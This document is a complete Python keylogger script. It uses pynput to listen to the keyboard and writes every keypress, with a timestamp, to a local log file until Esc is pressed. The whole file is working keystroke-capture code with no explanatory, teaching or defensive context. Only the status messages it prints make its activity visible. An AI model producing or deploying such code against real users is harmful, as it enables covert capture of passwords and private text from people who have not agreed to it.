from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("keylog.txt"), 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    """Callback function that triggers every time a key is pressed."""
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    """Callback function to stop the listener when 'Esc' is pressed."""
    if key == Key.esc:
        print("[*] Stopping Keylogger...")
        return False

def main():
    print("[*] Keylogger is active. Logging to 'keylog.txt'...")
    print("[*] Press 'Esc' to stop and save the log.")
    
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()